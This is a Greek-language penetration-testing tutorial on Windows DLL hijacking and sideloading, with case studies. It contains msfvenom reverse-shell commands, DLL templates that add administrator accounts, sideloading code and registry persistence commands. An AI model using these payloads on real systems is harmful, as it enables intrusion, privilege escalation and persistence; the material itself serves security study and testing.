# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει την χειραγώγηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, privilege escalation. Παρότι εδώ εστιάζουμε στο escalation, η μέθοδος του hijacking παραμένει ίδια ανεξαρτήτως στόχου.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται αρκετοί μέθοδοι για DLL hijacking, η καθεμία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας **DLL Proxying** για να διατηρηθεί η λειτουργικότητα του πρωτότυπου DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να το φορτώσει η εφαρμογή πιστεύοντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο στο WinSxS directory, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Binary Proxy Execution.

> [!TIP]
> Για μία βήμα-βήμα αλυσίδα που στρώσει HTML staging, AES-CTR configs και .NET implants πάνω σε DLL sideloading, δείτε τη ροή εργασίας παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση missing Dlls

Ο πιο κοινός τρόπος να βρείτε missing Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να εμφανίσετε μόνο την **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls in general** αφήνετε αυτό να τρέξει για μερικά **δεύτερα**.\
Αν ψάχνετε για ένα **missing dll μέσα σε ένα συγκεκριμένο εκτελέσιμο** θα πρέπει να βάλετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε, και να σταματήσετε την καταγραφή των γεγονότων**.

## Εκμετάλλευση Missing Dlls

Για να ανεβάσουμε privileges, η καλύτερη ευκαιρία που έχουμε είναι να μπορούμε να **γράψουμε ένα dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα γίνει αναζήτηση**. Επομένως, θα μπορούμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll θα αναζητηθεί πριν** από το φάκελο όπου βρίσκεται το **αρχικό dll** (παράξενο σενάριο), ή θα μπορέσουμε να **γράψουμε σε κάποιο φάκελο όπου το dll θα αναζητηθεί** και το πρωτότυπο **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Στην** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα DLLs.**

Οι **Windows applications** ψάχνουν για DLLs ακολουθώντας ένα σύνολο προκαθορισμένων διαδρομών αναζήτησης, σε συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα επιβλαβές DLL τοποθετείται στρατηγικά σε μία από αυτές τις τοποθεσίες, εξασφαλίζοντας ότι θα φορτωθεί πριν το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να βεβαιωθείτε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLLs που χρειάζεται.

Παρακάτω βλέπετε την **DLL search order σε 32-bit** συστήματα:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την καταχώρηση registry **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την στο 0 (η προεπιλογή είναι ενεργοποιημένη).

Εάν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH** η αναζήτηση ξεκινάει από το directory του executable module που φορτώνει το **LoadLibraryEx**.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί υποδεικνύοντας την απόλυτη διαδρομή αντί απλά το όνομα**. Σε αυτή την περίπτωση το dll **θα αναζητηθεί μόνο σε αυτή τη διαδρομή** (αν το dll έχει dependencies, αυτά θα αναζητηθούν όπως συνήθως — φορτωμένα με το όνομα).

Υπάρχουν και άλλοι τρόποι για να αλλαχθεί η σειρά αναζήτησης αλλά δεν θα τους αναλύσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας εξελιγμένος τρόπος για να επηρεάσετε με ντετερμινιστικό τρόπο το DLL search path μιας νεοδημιουργημένης διαδικασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διαδικασίας με τα native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο υπό τον έλεγχο του επιτιθέμενου, μια στοχευόμενη διεργασία που επιλύει ένα imported DLL με το όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα κακόβουλο DLL από εκείνον τον κατάλογο.

Κύρια ιδέα
- Κατασκευάστε τα process parameters με RtlCreateProcessParametersEx και δώστε ένα custom DllPath που δείχνει στο φάκελο που ελέγχετε (π.χ., ο κατάλογος όπου βρίσκεται ο dropper/unpacker σας).
- Δημιουργήστε τη διαδικασία με RtlCreateUserProcess. Όταν το target binary επιλύσει ένα DLL με το όνομα, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμα και όταν το κακόβουλο DLL δεν είναι colocated με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child process που δημιουργείται· διαφέρει από το SetDllDirectory, που επηρεάζει μόνο την τρέχουσα διεργασία.
- Το target πρέπει να import-άρει ή να κάνει LoadLibrary σε ένα DLL με το όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι σκληροκωδικοποιημένες απόλυτες διαδρομές δεν μπορούν να hijack-αριστούν. Τα forwarded exports και το SxS μπορεί να αλλάξουν την προτεραιότητα.

Ελάχιστο παράδειγμα σε C (ntdll, wide strings, απλοποιημένη διαχείριση σφαλμάτων):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή proxying στο πραγματικό) στον κατάλογο DllPath.
- Εκκινήστε ένα signed binary γνωστό ότι αναζητά xmllite.dll με το όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να οδηγεί σε multi-stage sideloading chains: ένας αρχικός launcher τοποθετεί ένα helper DLL, το οποίο στη συνέχεια spawn-άρει ένα Microsoft-signed, hijackable binary με custom DllPath για να εξαναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν staging directory.


#### Exceptions on dll search order from Windows docs

Ορισμένες εξαιρέσεις στην κανονική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν συναντιέται ένα **DLL που μοιράζεται το όνομά του με ένα που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντί γι' αυτό, πραγματοποιεί έλεγχο για redirection και manifest πριν προχωρήσει στο DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για το DLL**.
- Στις περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή του γνωστού DLL, μαζί με τυχόν εξαρτώμενα DLL, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των known DLLs.
- Εάν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα εξαρτώμενα DLL πραγματοποιείται σαν να είχαν υποδειχθεί μόνο από τα **module names**, ανεξαρτήτως του αν το αρχικό DLL προσδιορίστηκε μέσω πλήρους διαδρομής.

### Escalating Privileges

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal or lateral movement), η οποία **δεν διαθέτει DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** για οποιονδήποτε **directory** στον οποίο το **DLL** θα **αναζητηθεί**. Αυτή η τοποθεσία μπορεί να είναι ο φάκελος του εκτελέσιμου ή ένας φάκελος μέσα στο system path.

Ναι, τα προαπαιτούμενα είναι δύσκολα να βρεθούν καθώς **από προεπιλογή είναι κάπως περίεργο να βρεις ένα privileged executable που του λείπει ένα dll** και είναι ακόμη **πιο περίεργο να έχεις write permissions σε ένα φάκελο του system path** (δεν μπορείς από προεπιλογή). Αλλά, σε εσφαλμένα ρυθμισμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να δείτε το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **κύριος στόχος του project είναι να bypass UAC**, μπορεί να βρείτε εκεί ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανότατα απλά αλλάζοντας τη διαδρομή του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός εκτελέσιμου και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό για το πώς να **εκμεταλλευτείτε το Dll Hijacking για να αυξήσετε τα προνόμια** με δικαιώματα εγγραφής σε έναν **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να ανακαλύψετε αυτήν την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll_.

### Παράδειγμα

Σε περίπτωση που βρείτε σενάριο που μπορεί να εκμεταλλευτείτε, ένα από τα πιο σημαντικά για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [αναβαθμίσετε από το Medium Integrity level σε High **(παρακάμπτοντας το UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από [**High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system). Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking επικεντρωμένη στη χρήση dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με μη απαραίτητες εξαγόμενες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά και να **εκθέτει** και να **λειτουργεί** όπως αναμένεται μεταβιβάζοντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **καθορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll** ή να **ορίσετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86, δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Η δική σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που μεταγλωττίζετε πρέπει να **export several functions** που θα φορτωθούν από τη victim process. Αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα DLL σε C++ με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτική C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe συνεχίζει να ελέγχει ένα προβλέψιμο, γλωσσικά-ειδικό localization DLL κατά την εκκίνηση, το οποίο μπορεί να γίνει hijack για arbitrary code execution και persistence.

Βασικά στοιχεία
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν υπάρχει εγγράψιμο DLL υπό έλεγχο του attacker στο OneCore path, φορτώνεται και εκτελείται `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Ανακάλυψη με Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Ξεκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
- Ένα naive hijack θα ενεργοποιήσει/επισημάνει το UI. Για να μείνετε σιωπηλοί, κατά το attach απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και `SuspendThread` αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για τον πλήρη κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει τη φυτευμένη DLL. Στην secure desktop (logon screen), πατήστε CTRL+WIN+ENTER για να ξεκινήσετε το Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Η εκτέλεση σταματά όταν η RDP συνεδρία κλείσει — εισαγάγετε/μεταφερθείτε άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη Accessibility Tool (AT) καταχώρηση μητρώου (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισάγετε και μετά να ορίσετε το `configuration` στο όνομα αυτής της AT. Αυτό παρέχει proxy για αυθαίρετη εκτέλεση υπό το Accessibility framework.

Notes
- Η εγγραφή κάτω από `%windir%\System32` και η αλλαγή τιμών στο HKLM απαιτεί δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση επιδεικνύει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), καταγεγραμμένο ως **CVE-2025-1729**.

### Λεπτομέρειες Ευπάθειας

- **Συστατικό**: `TPQMAssistant.exe` που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη Εργασία**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 AM υπό το context του συνδεδεμένου χρήστη.
- **Δικαιώματα Καταλόγου**: Εγγράψιμο από `CREATOR OWNER`, επιτρέποντας σε τοπικούς χρήστες να αφήνουν αυθαίρετα αρχεία.
- **DLL Search Behavior**: Προσπαθεί πρώτα να φορτώσει το `hostfxr.dll` από τον working directory και καταγράφει "NAME NOT FOUND" αν λείπει, υποδεικνύοντας προτεραιότητα αναζήτησης στον τοπικό κατάλογο.

### Υλοποίηση Εκμετάλλευσης

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος την απουσία του DLL για να επιτύχει εκτέλεση κώδικα υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν εκτελεστεί η εργασία, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή με μεσαίο επίπεδο ακεραιότητας.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης UAC για ανύψωση από medium integrity σε προνόμια SYSTEM.

## Μελέτη Περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό ένα αξιόπιστο, υπογεγραμμένο process.

Chain overview
- Ο χρήστης κατεβάζει MSI. Μια CustomAction εκτελείται αθόρυβα κατά την εγκατάσταση GUI (π.χ., LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από ενσωματωμένους πόρους.
- Ο dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο φάκελο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το υπογεγραμμένο EXE ξεκινήσει, η Windows DLL search order φορτώνει το wsc.dll από τον working directory πρώτο, εκτελώντας attacker code υπό υπογεγραμμένο parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- Πίνακας CustomAction:
- Ψάξτε για εγγραφές που εκτελούν εκτελέσιμα ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ενσωματωμένο αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), εξετάστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διασπασμένα payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Ψάξτε για πολλά μικρά κομμάτια που συγχωνεύονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνήθης ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος ψηφιακά υπογεγραμμένος host (Avast). Η διαδικασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό του.
- wsc.dll: DLL του επιτιθέμενου. Εάν δεν απαιτούνται συγκεκριμένα exports, το DllMain επαρκεί; διαφορετικά, κατασκευάστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ εκτελείτε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για τις απαιτήσεις εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονόματος DLL από το host binary. Εάν το host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
